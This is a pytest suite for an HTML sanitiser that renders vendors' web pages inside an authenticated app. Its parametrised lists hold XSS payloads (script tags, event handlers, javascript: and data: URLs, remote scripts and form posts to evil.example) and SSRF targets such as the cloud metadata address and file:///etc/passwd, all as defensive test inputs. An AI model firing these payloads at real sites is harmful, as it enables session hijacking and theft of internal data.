"""Putting a stranger's page inside our product, inertly.

This is HTML written by someone else, rendered inside an authenticated
app. The sanitiser is the whole file and these are the tests that matter:
every one of them is an XSS that would otherwise run in a session with
the practitioner's business data behind it.

There are two layers by design — this stripper, and a fully sandboxed
iframe on the client with no allow-scripts and no allow-same-origin.
Layer two alone would be sound in a current browser; layer one alone
would be sound if sanitisers were perfect. They are not, which is why
there are two.
"""
from __future__ import annotations

import re
import sys
import pathlib

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

import pytest

import site_reader as sr

BASE = "https://vendor.example/shop/"


def _clean(html: str) -> str:
    return sr.sanitize(html, BASE)


# ─── Nothing may execute ─────────────────────────────────────────────

EXECUTABLE = [
    ("<script>alert(1)</script>", "plain script"),
    ("<SCRIPT>alert(1)</SCRIPT>", "uppercase script"),
    ("<script src='https://evil.example/x.js'></script>", "remote script"),
    ("<script type='text/javascript'>steal()</script>", "typed script"),
    ("<img src=x onerror='alert(1)'>", "onerror handler"),
    ("<div onclick=\"alert(1)\">click</div>", "onclick handler"),
    ("<div ONMOUSEOVER=alert(1)>hover</div>", "unquoted handler"),
    ("<body onload='alert(1)'>hi</body>", "onload handler"),
    ("<iframe src='https://evil.example'></iframe>", "nested iframe"),
    ("<object data='evil.swf'></object>", "object"),
    ("<embed src='evil.swf'>", "embed"),
    ("<svg><script>alert(1)</script></svg>", "svg script"),
    ("<form action='https://evil.example'><input name=x></form>", "form post"),
    ("<meta http-equiv='refresh' content='0;url=https://evil.example'>", "meta refresh"),
    ("<link rel=stylesheet href='https://evil.example/x.css'>", "remote stylesheet"),
    ("<base href='https://evil.example/'>", "base hijack"),
]


@pytest.mark.parametrize("payload,label", EXECUTABLE)
def test_nothing_executable_survives(payload, label):
    out = _clean(f"<html><body><p>real content</p>{payload}</body></html>")
    low = out.lower()
    for tag in ("<script", "<iframe", "<object", "<embed", "<form",
                "<meta", "<link", "<base"):
        assert tag not in low, f"{label}: {tag} survived -> {out[:200]}"
    assert not re.search(r"\son[a-z]+\s*=", out, re.I), f"{label}: handler survived"
    # The page's real words are still there — a sanitiser that eats the
    # content has not solved the problem, it has replaced it.
    assert "real content" in out


def test_script_CONTENT_is_removed_not_just_its_tags():
    """Neutralising `<script` alone leaves the JavaScript behind as
    visible page text — a vendor's inline config dumped on screen. This
    is what the block stripper is actually for, and nothing else in the
    chain does it."""
    out = _clean("<p>real</p><script>var SECRET_TOKEN='abc';alert(1)</script>")
    assert "SECRET_TOKEN" not in out
    assert "alert(1)" not in out
    assert "real" in out


def test_style_CONTENT_is_removed_too():
    """Same failure, different tag: a stylesheet body printed as text."""
    out = _clean("<p>real</p><style>.x{content:'CSS_MARKER'}</style>")
    assert "CSS_MARKER" not in out
    assert "real" in out


@pytest.mark.parametrize("scheme", ["javascript", "JavaScript", "vbscript",
                                    "data", "file"])
def test_dangerous_url_schemes_are_dropped(scheme):
    out = _clean(f"""<a href="{scheme}:alert(1)">click me</a>""")
    assert f"{scheme.lower()}:" not in out.lower()
    # The text stays; only the destination goes.
    assert "click me" in out


def test_a_script_that_hides_a_closing_tag_in_a_string_is_still_removed():
    """The classic escape: a filter that stops at the inner </script>
    leaves a live opening tag behind. re.sub replaces every
    non-overlapping match in one call, so a single pass already handles
    this — verified, rather than assumed, when the second pass turned out
    not to be what saves it."""
    payload = ("<script>var s = \"</script><script>alert(1)</script>\";</script>"
               "<p>after</p>")
    out = _clean(payload)
    assert "<script" not in out.lower(), out[:200]
    assert "after" in out


def test_a_bare_unclosed_script_tag_is_removed():
    out = _clean("<p>before</p><script src=x.js><p>after</p>")
    assert "<script" not in out.lower()


# ─── Content survives, and still points somewhere real ───────────────

def test_the_page_keeps_its_words_and_structure():
    out = _clean("<html><body><h1>Wholesale</h1><ul><li>Net 30</li>"
                 "<li>MOQ 24</li></ul><p>Call us.</p></body></html>")
    for needle in ("Wholesale", "Net 30", "MOQ 24", "Call us.",
                   "<h1", "<ul", "<li"):
        assert needle in out


def test_relative_links_and_images_are_made_absolute():
    """Detached from its origin, a relative URL points at US. Rewriting
    them is what keeps a picture a picture and a link a link."""
    out = _clean('<a href="/wholesale">Trade</a><img src="../img/logo.png">')
    assert 'href="https://vendor.example/wholesale"' in out
    assert 'src="https://vendor.example/img/logo.png"' in out


def test_anchors_and_mail_links_are_left_alone():
    out = _clean('<a href="#top">Top</a><a href="mailto:a@b.com">Mail</a>'
                 '<a href="tel:555">Call</a>')
    assert 'href="#top"' in out
    assert 'href="mailto:a@b.com"' in out
    assert 'href="tel:555"' in out


def test_srcset_is_dropped_rather_than_half_rewritten():
    """A partly-rewritten srcset renders nothing at all; src carries the
    image on its own."""
    out = _clean('<img src="/a.png" srcset="/a.png 1x, /a@2x.png 2x">')
    assert "srcset" not in out.lower()
    assert 'src="https://vendor.example/a.png"' in out


def test_inline_styles_go_but_the_element_stays():
    """Their stylesheet is not loaded, so inline styles would style
    fragments against our theme — and style attributes can carry url()."""
    out = _clean('<p style="position:fixed;top:0">words</p>')
    assert "style=" not in out.lower()
    assert "words" in out


def test_only_the_body_is_kept():
    out = _clean("<html><head><title>T</title></head><body><p>B</p></body></html>")
    assert "<title" not in out.lower()
    assert "B" in out


# ─── Honest about what it could not do ───────────────────────────────

def test_a_javascript_rendered_shell_is_reported_as_empty():
    """A blank white box would let somebody conclude the vendor has no
    website. "This page needs a real browser" is the true answer."""
    shell = '<html><body><div id="root"></div><script>render()</script></body></html>'
    assert sr._looks_empty(_clean(shell)) is True


def test_a_real_page_is_not_reported_as_empty():
    real = "<html><body><p>" + ("Wholesale terms and conditions. " * 20) + "</p></body></html>"
    assert sr._looks_empty(_clean(real)) is False


def test_an_oversized_page_is_capped_and_says_so(monkeypatch):
    big = "<html><body>" + ("<p>word</p>" * 200000) + "</body></html>"
    monkeypatch.setattr(sr, "_fetch_capped", lambda c, u, want="html": (u, big))
    monkeypatch.setattr(sr, "guard_url", lambda u, **kw: None)
    out = sr.read("https://vendor.example/")
    assert out["ok"] is True
    assert out["truncated"] is True
    assert len(out["html"]) <= sr._MAX_CHARS


# ─── SSRF, again, because this fetches too ───────────────────────────

@pytest.mark.parametrize("url", [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:9000/",
    "https://192.168.0.1/",
    "file:///etc/passwd",
    "http://example.com:9999/",
])
def test_the_reader_refuses_dangerous_urls_before_fetching(url, monkeypatch):
    monkeypatch.setattr(sr, "_fetch_capped",
                        lambda *a, **kw: pytest.fail(f"fetched {url}"))
    out = sr.read(url)
    assert out["ok"] is False
    assert out.get("error")


def test_an_unreachable_page_reports_the_failure(monkeypatch):
    monkeypatch.setattr(sr, "guard_url", lambda u, **kw: None)
    monkeypatch.setattr(sr, "_fetch_capped",
                        lambda c, u, want="html": (_ for _ in ()).throw(ValueError("HTTP 403")))
    out = sr.read("https://vendor.example/")
    assert out["ok"] is False
    assert "403" in out["error"]
